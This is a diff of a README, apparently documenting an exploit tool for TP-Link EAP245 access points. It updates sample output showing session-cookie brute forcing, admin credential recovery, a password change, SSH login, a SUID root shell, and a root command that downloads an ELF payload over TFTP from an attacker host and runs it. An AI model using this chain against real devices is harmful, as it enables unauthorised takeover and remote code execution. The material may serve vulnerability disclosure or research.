@@ -160,14 +160,15 @@ It'll give output like:
 ```
 $ python x.py 192.168.1.1 192.168.10.5 out.elf
 INFO - Device: EAP245, Firmware: 5.0.3 Build 20210604 Rel. 51934
-INFO - Found range 2346486:2348544
-INFO - Spike detected, waiting 20 seconds
-INFO - Starting cookie brute for range 2346486:2348544
-INFO - valid cookie c0a80a050023d1fb (attempt 1:2347515)
+INFO - Spike Detected
+INFO - Found range 26230074:26234958
+INFO - Waiting 20 seconds to ensure a login
+INFO - Starting cookie brute for range 26230074:26234958
+INFO - valid cookie c0a80a0501903e3c (attempt 0:26230332)
 INFO - Creds: admin:CEACDC2F5A0DC0D42FFB0372B9446CD6
 INFO - Changing the user password to `badpassword`
-INFO - trying shell!
-INFO - got shell, attempt to privesc to root
+INFO - Attempting to login via SSH
+INFO - Got a shell, creating a SUID sh
 INFO - Running the following as root: tftp -g -r out.elf -l /tmp/out.elf 192.168.10.5:9069 ; chmod +x /tmp/out.elf ; /tmp/out.elf &
 INFO - Cleaning up
 INFO - Resetting ssh status and user password back to the original
